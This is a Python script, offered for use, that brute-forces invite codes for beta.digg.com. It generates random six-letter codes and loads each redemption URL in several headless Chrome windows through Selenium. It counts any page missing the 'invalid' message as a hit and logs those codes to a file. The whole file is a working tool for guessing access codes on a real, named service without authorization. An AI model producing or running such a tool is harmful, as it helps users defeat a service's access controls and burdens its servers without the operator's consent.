#!/usr/bin/env python3
"""
Digg Invite Code Brute Force Tool
Generates and tests invite codes for beta.digg.com using Selenium with multi-threading support.
"""

import itertools
import string
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager
import os
from datetime import datetime

class DiggInviteBruteForcer:
    def __init__(self, num_windows=1, headless=True):
        self.num_windows = num_windows
        self.headless = headless
        self.base_url = "https://beta.digg.com/d/invite/redeem?code="
        self.invalid_text = "Uh oh! This code is invalid."
        self.valid_codes = []
        self.tested_codes = set()
        self.lock = threading.Lock()
        self.results_file = f"valid_digg_codes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        # Progress tracking
        self.start_time = None
        self.total_codes_to_test = 0
        self.codes_tested_count = 0
        
        # Create results directory if it doesn't exist
        os.makedirs("results", exist_ok=True)
        self.results_file = os.path.join("results", self.results_file)
        
    def setup_driver(self):
        """Setup Chrome driver with optimized options"""
        chrome_options = Options()
        
        # Basic security and performance options
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-images")
        chrome_options.add_argument("--window-size=800,600")
        
        # Add headless mode if requested
        if self.headless:
            chrome_options.add_argument("--headless")
            # Don't disable JavaScript - we need it to load the error message!
        
        # Disable logging
        chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_experimental_option("detach", True)
        
        try:
            # Try to install ChromeDriver automatically
            service = Service(ChromeDriverManager().install())
        except Exception as e:
            print(f"⚠️  ChromeDriver auto-install failed: {e}")
            print("Trying to use system ChromeDriver...")
            # Fall back to system chromedriver
            service = Service()
        
        try:
            driver = webdriver.Chrome(service=service, options=chrome_options)
            driver.set_page_load_timeout(10)
            return driver
        except Exception as e:
            print(f"❌ Failed to start Chrome: {e}")
            print("\n🔧 Troubleshooting tips:")
            print("1. Make sure Chrome is installed: sudo apt install google-chrome-stable")
            print("2. Install ChromeDriver manually: sudo apt install chromium-chromedriver")
            print("3. Try updating webdriver-manager: pip install --upgrade webdriver-manager")
            raise
        
    def generate_random_code(self, length=6):
        """Generate a single random lowercase code of given length"""
        chars = string.ascii_lowercase
        return ''.join(random.choice(chars) for _ in range(length))
    
    def generate_codes(self, num_codes=100000):
        """Generate random unique codes"""
        generated = set()
        chars = string.ascii_lowercase
        
        while len(generated) < num_codes:
            # Generate a random 6-character code
            code = ''.join(random.choice(chars) for _ in range(6))
            if code not in generated:
                generated.add(code)
                yield code
            
    def test_code(self, driver, code):
        """Test a single invite code"""
        try:
            url = self.base_url + code
            driver.get(url)
            
            # Wait for page to load and JavaScript to execute
            try:
                # First, wait for the basic page structure to load
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )
                
                # Wait a bit more for JavaScript to potentially show the error message
                time.sleep(2)
                
                # Try to find the error message element specifically
                try:
                    # Look for text that contains the invalid message
                    error_element = driver.find_element(By.XPATH, f"//*[contains(text(), '{self.invalid_text}')]")
                    if error_element:
                        return False, code, "Invalid code"
                except:
                    # If we can't find the error element, check page source as backup
                    page_source = driver.page_source
                    if self.invalid_text in page_source:
                        return False, code, "Invalid code"
                    
                # If no invalid message found, check for valid indicators
                page_source = driver.page_source
                
                # Look for signs that this might be a valid code
                # Valid codes might redirect or show different content
                if "sign up" in page_source.lower() or "welcome" in page_source.lower() or "register" in page_source.lower():
                    return True, code, "Valid code found!"
                elif self.invalid_text not in page_source:
                    # If there's no invalid message and we're not sure, treat as potentially valid
                    return True, code, "Potentially valid code (no error message)"
                else:
                    return False, code, "Invalid code"
                    
            except TimeoutException:
                return False, code, "Timeout"
                
        except WebDriverException as e:
            return False, code, f"WebDriver error: {str(e)[:50]}"
        except Exception as e:
            return False, code, f"Error: {str(e)[:50]}"
            
    def save_valid_code(self, code):
        """Save valid code to file"""
        url = self.base_url + code
        with self.lock:
            self.valid_codes.append(code)
            with open(self.results_file, 'a') as f:
                f.write(f"{code} - {url} - Found at {datetime.now()}\n")
            print(f"✅ VALID CODE FOUND: {url} (saved to {self.results_file})")
    
    def print_progress(self):
        """Print progress with time estimation and percentage"""
        if self.start_time is None or self.total_codes_to_test == 0:
            return
            
        elapsed_time = time.time() - self.start_time
        percentage = (self.codes_tested_count / self.total_codes_to_test) * 100
        
        if self.codes_tested_count > 0:
            avg_time_per_code = elapsed_time / self.codes_tested_count
            remaining_codes = self.total_codes_to_test - self.codes_tested_count
            estimated_remaining_seconds = remaining_codes * avg_time_per_code
            
            # Format time remaining
            hours = int(estimated_remaining_seconds // 3600)
            minutes = int((estimated_remaining_seconds % 3600) // 60)
            seconds = int(estimated_remaining_seconds % 60)
            
            if hours > 0:
                time_remaining = f"{hours}h {minutes}m {seconds}s"
            elif minutes > 0:
                time_remaining = f"{minutes}m {seconds}s"
            else:
                time_remaining = f"{seconds}s"
            
            print(f"📊 Progress: {self.codes_tested_count}/{self.total_codes_to_test} ({percentage:.1f}%) | "
                  f"Valid codes: {len(self.valid_codes)} | "
                  f"ETA: {time_remaining}")
        else:
            print(f"📊 Progress: {self.codes_tested_count}/{self.total_codes_to_test} ({percentage:.1f}%)")
            
    def worker(self, worker_id, code_generator):
        """Worker function for each browser window"""
        driver = None
        codes_tested = 0
        
        try:
            print(f"🚀 Starting worker {worker_id}")
            driver = self.setup_driver()
            
            for code in code_generator:
                with self.lock:
                    if code in self.tested_codes:
                        continue
                    self.tested_codes.add(code)
                
                is_valid, tested_code, result = self.test_code(driver, code)
                codes_tested += 1
                
                if is_valid:
                    self.save_valid_code(tested_code)
                
                # Update global progress counter
                with self.lock:
                    self.codes_tested_count += 1
                    
                    # Print progress every 50 codes tested globally (not per worker)
                    if self.codes_tested_count % 50 == 0:
                        self.print_progress()
                
                # Small delay to prevent overwhelming the server
                time.sleep(0.5)  # Increased delay since we need to wait for JS
                
        except KeyboardInterrupt:
            print(f"Worker {worker_id} interrupted by user")
        except Exception as e:
            print(f"Worker {worker_id} error: {e}")
        finally:
            if driver:
                driver.quit()
            print(f"Worker {worker_id} finished. Tested {codes_tested} codes.")
            
    def run(self):
        """Main execution function"""
        print(f"🔍 Starting Digg invite code brute force with {self.num_windows} windows")
        print(f"📁 Valid codes will be saved to: {self.results_file}")
        print("Press Ctrl+C to stop\n")
        
        # Create random code generator
        codes_per_worker = getattr(self, 'codes_per_worker', 10000)  # Use user's choice or default
        total_codes = codes_per_worker * self.num_windows
        
        # Initialize progress tracking
        self.total_codes_to_test = total_codes
        self.start_time = time.time()
        
        print(f"🎲 Generating {total_codes} random codes ({codes_per_worker} per worker)")
        
        # Generate random codes for each worker
        code_lists = [[] for _ in range(self.num_windows)]
        code_gen = self.generate_codes(total_codes)
        
        for i, code in enumerate(code_gen):
            code_lists[i % self.num_windows].append(code)
        
        start_time = time.time()
        
        try:
            with ThreadPoolExecutor(max_workers=self.num_windows) as executor:
                futures = []
                for i in range(self.num_windows):
                    future = executor.submit(self.worker, i+1, iter(code_lists[i]))
                    futures.append(future)
                
                # Wait for completion
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        print(f"Worker exception: {e}")
                        
        except KeyboardInterrupt:
            print("\n🛑 Stopping all workers...")
            
        end_time = time.time()
        total_tested = len(self.tested_codes)
        
        print(f"\n📊 Summary:")
        print(f"   Time elapsed: {end_time - start_time:.2f} seconds")
        print(f"   Total codes tested: {total_tested}")
        print(f"   Valid codes found: {len(self.valid_codes)}")
        print(f"   Results saved to: {self.results_file}")
        
        if self.valid_codes:
            print(f"\n🎉 Valid codes found:")
            for code in self.valid_codes:
                print(f"   - {code}")

def main():
    print("🎯 Digg Invite Code Brute Force Tool")
    print("=" * 40)
    
    # Get number of windows from user
    while True:
        try:
            windows_input = input("How many Chrome windows do you want to run? [default: 4]: ").strip()
            if windows_input == '':
                num_windows = 4
                break
            else:
                num_windows = int(windows_input)
                if num_windows > 0:
                    break
                else:
                    print("Please enter a positive number.")
        except ValueError:
            print("Please enter a valid number.")
    
    # Get headless preference from user
    while True:
        try:
            headless_choice = input("Run browsers in headless mode? (y/n) [default: y]: ").lower().strip()
            if headless_choice == '' or headless_choice == 'y' or headless_choice == 'yes':
                headless = True
                break
            elif headless_choice == 'n' or headless_choice == 'no':
                headless = False
                break
            else:
                print("Please enter 'y' for yes or 'n' for no.")
        except KeyboardInterrupt:
            print("\nExiting...")
            return
    
    # Get number of codes to test
    while True:
        try:
            codes_input = input("How many codes to test per worker? [default: 10000]: ").strip()
            if codes_input == '':
                codes_per_worker = 10000
                break
            else:
                codes_per_worker = int(codes_input)
                if codes_per_worker > 0:
                    break
                else:
                    print("Please enter a positive number.")
        except ValueError:
            print("Please enter a valid number.")
        except KeyboardInterrupt:
            print("\nExiting...")
            return
    
    mode_text = "headless" if headless else "visible"
    print(f"\n🔧 Setting up {num_windows} Chrome windows in {mode_text} mode...")
    
    # Create and run brute forcer
    brute_forcer = DiggInviteBruteForcer(num_windows, headless)
    brute_forcer.codes_per_worker = codes_per_worker  # Pass the user's choice
    brute_forcer.run()

if __name__ == "__main__":
    main()
